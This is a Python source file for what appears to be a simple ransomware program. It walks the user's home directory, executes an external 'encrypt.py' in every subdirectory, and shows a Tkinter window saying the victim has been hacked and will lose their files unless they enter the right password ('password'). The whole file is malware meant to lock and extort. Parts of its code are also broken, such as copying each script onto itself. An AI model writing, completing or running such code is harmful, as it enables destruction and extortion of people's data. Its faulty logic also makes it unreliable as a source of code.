import os
from cryptography.fernet import Fernet
import shutil
import tkinter as tk
"HAHAHA you have been hacked, find the right password to get your files back, closing/ending this program will result in permanent loss of files"
directory_path = os.path.expanduser('~')
root_directory = os.path.expanduser('~')
window = tk.Tk()
window.title('get hacked')
window.geometry('1000x500')
label = tk.Label(window,text="HAHAHA you have been hacked, \n find the right password to get your files back, \n closing/ending this program will result in permanent loss of files",font=("Arial",25))
label.place(x=100,y=100)
entry = tk.Entry(window)
entry.place(x=350,y=200)

labelinfo = tk.Label(window,font=("Arial",25),text='')
labelinfo.place(x=300,y=250)

for root, directories, files in os.walk(root_directory):
    for directory in directories:
        subdirectory_path = os.path.join(root, directory)
        if os.path.isdir(subdirectory_path):
            os.chdir(f'{subdirectory_path}')
            shutil.copy('encrypt.py', 'encrypt.py')
            with open(f"{subdirectory_path}/encrypt.py") as f:
                exec(f.read())
            os.remove(f'{subdirectory_path}/encrypt.py')



def on_enter_pressed(event):
    entryget = entry.get()
    if entryget == 'password':
        for root, directories, files in os.walk(root_directory):
            for directory in directories:
                subdirectory_path = os.path.join(root, directory)
                if os.path.isdir(subdirectory_path):
                    os.chdir(f'{subdirectory_path}')
                    shutil.copy('decrypt.py', 'decrypt.py')
                    with open(f"{subdirectory_path}/decrypt.py") as f:
                        exec(f.read())
                    os.remove(f'{subdirectory_path}/decrypt.py')
                    # print('your files are now yours')
                    labelinfo['text'] = 'correct, your files are now decrypted'
        # exit()

    else:
        print('incorrect password try again')
        labelinfo['text'] = 'incorrect password try again'
entry.bind('<Return>', on_enter_pressed)




window.mainloop()